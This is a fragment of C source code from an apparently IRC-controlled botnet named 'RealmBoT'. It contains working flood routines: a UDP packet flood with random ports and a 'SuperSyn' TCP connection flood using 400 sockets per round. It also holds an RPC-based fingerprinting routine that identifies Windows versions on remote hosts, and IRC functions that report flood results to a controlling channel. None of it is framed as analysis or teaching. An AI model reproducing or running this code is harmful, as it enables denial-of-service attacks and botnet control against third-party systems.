	int i;

	srand(GetTickCount());

	SOCKET usock = fsocket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
	SOCKADDR_IN ssin;
	memset(&ssin, 0, sizeof(ssin));
	ssin.sin_family = AF_INET;

	IN_ADDR iaddr;
	iaddr.s_addr = finet_addr(udp.host);
	LPHOSTENT hostent = NULL;
	if (iaddr.s_addr == INADDR_NONE)
		hostent = fgethostbyname(udp.host);
	if (hostent == NULL && iaddr.s_addr == INADDR_NONE) {
		sprintf(sendbuf,"RealmBoT (udp.p.l.g) .»».  Error sending pings to %s.", udp.host);
		if (!udp.silent) irc_privmsg(udp.sock, udp.chan, sendbuf, udp.notice);
		addlog(sendbuf);

		clearthread(udp.threadnum);

		ExitThread(1);
	}
	ssin.sin_addr = ((hostent != NULL)?(*((LPIN_ADDR)*hostent->h_addr_list)):(iaddr));
	ssin.sin_port = ((udp.port == 0)?(fhtons((unsigned short)((rand() % MAXPINGSIZE) + 1))):(fhtons((unsigned short)udp.port)));

	if (udp.port < 1)
		udp.port = 1;
	if (udp.port > MAXUDPPORT)
		udp.port = MAXUDPPORT;
	udp.num = udp.num / 10;
	if (udp.delay == 0)
		udp.delay = 1;

	for (i = 0; i < udp.size; i++)
		pbuff[i] = (char)(rand() % 255);
	while (udp.num-- > 0) {
		//change port every 10 packets (if one isn't specified)
		for (i = 0; i < 11; i++) {
			fsendto(usock, pbuff, udp.size-(rand() % 10), 0, (LPSOCKADDR)&ssin, sizeof(ssin));
			Sleep(udp.delay);
		}
		if (udp.port == 0)
			ssin.sin_port = fhtons((unsigned short)((rand() % MAXPINGSIZE) + 1));
	}
	sprintf(sendbuf,"RealmBoT (udp.p.l.g) .»».  Finished sending packets to %s.", udp.host);
	if (!udp.silent) irc_privmsg(udp.sock, udp.chan, sendbuf, udp.notice);
	addlog(sendbuf);

	clearthread(udp.threadnum);

	ExitThread(0);
}
#endif
#ifndef NO_SUPERSYN

#define MAX_PACK_LEN 65535
#define SIO_RCALL 0x98000001
#define SUPERSYN_SOCKETS 400


#define SYN_DPORT 2000
#define SYN_XORVAL 0xFFFFFFFF
#define SYN_SPOOF_TEST 2001
#define SYN_SPOOF_GOOD 2002

DWORD WINAPI SuperSynThread(LPVOID param)
{
	char sendbuf[IRCLINE];

	SUPERSYN supersyn = *((SUPERSYN *)param);
	SUPERSYN *supersyns = (SUPERSYN *)param;
	supersyns->gotinfo = TRUE;

	sprintf(sendbuf, "[SUPERSYN]: Done with flood (%iKB/sec)", SuperSyn(supersyn.ip, supersyn.port, supersyn.length));
	if (!supersyn.silent) irc_privmsg(supersyn.sock, supersyn.chan, sendbuf, supersyn.notice);
	addlog(sendbuf);

	clearthread(supersyn.threadnum);

	ExitThread(0);
}

long SuperSynSend(unsigned long TargetIP, unsigned short TargetPort, int len)
{
	int superdelay = 100;
	SOCKADDR_IN    SockAddr;
	SOCKET         sock[SUPERSYN_SOCKETS];
   	IN_ADDR iaddr;
	memset(&SockAddr, 0, sizeof(SockAddr));
	SockAddr.sin_family = AF_INET;
   	SockAddr.sin_port = fhtons(TargetPort);
	LPHOSTENT lpHostEntry = NULL;
 	DWORD mode = 1;
	int c,i;
	iaddr.s_addr = TargetIP;
	SockAddr.sin_addr = iaddr; //ip addy
	i = 0;
	while (i < len) {
		for (c=0;c<SUPERSYN_SOCKETS;c++)
		{
			sock[c] = socket(AF_INET, SOCK_STREAM, 0);
   			if (sock[c] == INVALID_SOCKET)
      				continue;
			ioctlsocket(sock[c],FIONBIO,&mode);
		}
		for (c=0;c<SUPERSYN_SOCKETS;c++)
  			connect(sock[c], (PSOCKADDR) &SockAddr, sizeof(SockAddr));
      		Sleep(superdelay);
		for (c=0;c<SUPERSYN_SOCKETS;c++)
			closesocket(sock[c]); //close sockets
		i++;
	}
	return 0;
}

long SuperSyn(char *target, char *port, char *len)
{
	unsigned long TargetIP = ResolveAddress(target);
	unsigned short p = (unsigned short)atoi(port);
	int t = atoi(len);

	long num = SuperSynSend(TargetIP, p, t);

	if (num == 0)
		num = 1;
	num = num / 1000 / t;

	return num;
}

#endif



char rpcfp_bindstr[]=
"\x05\x00\x0b\x03\x10\x00\x00\x00\x48\x00\x00\x00\x01\x00\x00\x00"
"\xd0\x16\xd0\x16\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x01\x00"
"\x80\xbd\xa8\xaf\x8a\x7d\xc9\x11\xbe\xf4\x08\x00\x2b\x10\x29\x89"
"\x01\x00\x00\x00\x04\x5d\x88\x8a\xeb\x1c\xc9\x11\x9f\xe8\x08\x00"
"\x2b\x10\x48\x60\x02\x00\x00\x00";

char rpcfp_inqifids[]=
"\x05\x00\x00\x03\x10\x00\x00\x00\x18\x00\x00\x00\x01\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00";

char w2kuuid_sig[]=
"\xB0\x01\x52\x97\xCA\x59\xD0\x11\xA8\xD5\x00\xA0\xC9\x0D\x80\x51";

char wxpuuid_sig[]=
"\x26\xB5\x55\x1D\x37\xC1\xC5\x46\xAB\x79\x63\x8F\x2A\x68\xE8\x69";


bool MemContains(const char *pMem, const int iMemLen, const char *pSearch, const int iSearchLen)
{
	for(int i=0;i<iMemLen-iSearchLen;i++)
		if(!memcmp(pMem+i, pSearch, iSearchLen))
			return true;

	return false;
}

int FpHost(const char *szHost, int iFpType)
{
	switch(iFpType) {
	case FP_RPC:
		{
			char szRecvBuf[8192];

			int iRetVal=OS_UNKNOWN;
			int sSocket=fsocket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

			if(sSocket==SOCKET_ERROR || sSocket==INVALID_SOCKET)
				return OS_UNKNOWN;

			SOCKADDR_IN ssin;
			memset(&ssin, 0, sizeof(ssin));
			ssin.sin_family=AF_INET;
			ssin.sin_port=fhtons(135);
			ssin.sin_addr.s_addr=ResolveAddress((char *)szHost);

			int iErr=fconnect(sSocket, (LPSOCKADDR)&ssin, sizeof(ssin));
			if(iErr!=SOCKET_ERROR) {
				iErr=fsend(sSocket, rpcfp_bindstr, sizeof(rpcfp_bindstr)-1, 0);
				if(iErr==SOCKET_ERROR) {
					fclosesocket(sSocket);
					return iRetVal;
				}
				iErr=frecv(sSocket, szRecvBuf, sizeof(szRecvBuf), 0);
				if(iErr==SOCKET_ERROR) {
					fclosesocket(sSocket);
					return iRetVal;
				}
				if(szRecvBuf[2]==DCE_PKT_BINDACK) {
					iErr=fsend(sSocket, rpcfp_inqifids, sizeof(rpcfp_inqifids)-1,0);
					if(iErr==SOCKET_ERROR) {
						fclosesocket(sSocket);
						return iRetVal;
					}
					iErr=frecv(sSocket, szRecvBuf, sizeof(szRecvBuf),0);
					if(iErr==SOCKET_ERROR) {
						fclosesocket(sSocket);
						return iRetVal;
					}
					if(szRecvBuf[2]==DCE_PKT_RESPONSE) {
						if(MemContains(szRecvBuf, iErr, w2kuuid_sig, sizeof(w2kuuid_sig)-1)) {
							if(iErr<300)
								iRetVal=OS_WINNT;
							else
								iRetVal=OS_WIN2K;
						} else
							if(MemContains(szRecvBuf, iErr, wxpuuid_sig, sizeof(wxpuuid_sig)-1))
								iRetVal=OS_WINXP;
							else
								iRetVal=OS_UNKNOWN;
					} else {
						fclosesocket(sSocket);
						return iRetVal;
					}
				} else {
					fclosesocket(sSocket);
					return iRetVal;
				}
			} else {
				fclosesocket(sSocket);
				return iRetVal;
			}
			fclosesocket(sSocket);
			return iRetVal;
		}
		break;
	case FP_PORT5K:
		if(AdvPortOpen(finet_addr(szHost), 5000, 3)) return OS_WINXP;
		break;
	case FP_TTL:
		return OS_UNKNOWN;
		break;
	default:
		return OS_UNKNOWN;
		break;
	}
	return OS_UNKNOWN;
}


// globals
extern FILE *fp;

// irc send functions
void irc_sendv(SOCKET sock, char *msg, ...)
{
	char msgbuf[IRCLINE];

	va_list argp;
	va_start(argp, msg);
	_vsnprintf(msgbuf, sizeof(msgbuf), msg, argp);
	fsend(sock, msgbuf, strlen(msgbuf), 0);

	#ifdef DEBUG_LOGGING
	debuglog(msgbuf,FALSE);
	#endif

	return;
}

void irc_privmsg(SOCKET sock, char *dest, char *msg, BOOL notice, BOOL delay)
{
	char msgbuf[IRCLINE], tmpbuf[IRCLINE], *action;

	if (notice)
		action = "NOTICE";
	else
		action = "PRIVMSG";

	int bufsize = IRCLINE - strlen(action) - strlen(dest) - 6 ; // trust me
	_snprintf(tmpbuf,bufsize,"%s",msg);
	sprintf(msgbuf,"%s %s :%s\r\n", action, dest, tmpbuf);
	fsend(sock, msgbuf, strlen(msgbuf), 0);

	#ifdef DEBUG_LOGGING
	debuglog(msgbuf,FALSE);
	#endif

	if(delay)
		Sleep(FLOOD_DELAY);

	return;
}

